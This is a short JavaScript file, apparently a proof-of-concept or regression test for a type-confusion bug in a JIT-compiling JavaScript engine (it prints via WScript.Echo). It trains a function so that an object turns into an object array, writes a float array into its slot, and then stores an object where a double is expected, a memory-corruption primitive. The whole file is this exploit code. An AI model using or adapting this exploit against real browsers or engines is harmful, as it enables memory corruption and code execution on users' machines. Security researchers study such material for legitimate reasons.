let inline = {"push":Array.prototype.push, "x":Array};

let d = [1.1,2.2];

function jit(arg, arg2){
	arg.x = d;
	let x = arg2.push(1);   //make object become objectarray.
	arg.x = d;		//write |d| to the slot of |ObjectArray|
}

flag = 0;
for(let i = 0;i < 2; i++){
	let not = {"push":Array.prototype.push, "x":Array};
	jit(inline, not);
}

jit(inline, inline);

function exploit(value){
	d[1] = 1.1;
	inline[0x1] = value;
	d[1] = 6.17651672645e-312;
}

for(let i = 0;i < 2;i++){
	exploit(3.3);
}

exploit({});
if (d[1] === 6.17651672645e-312)
    WScript.Echo('pass');
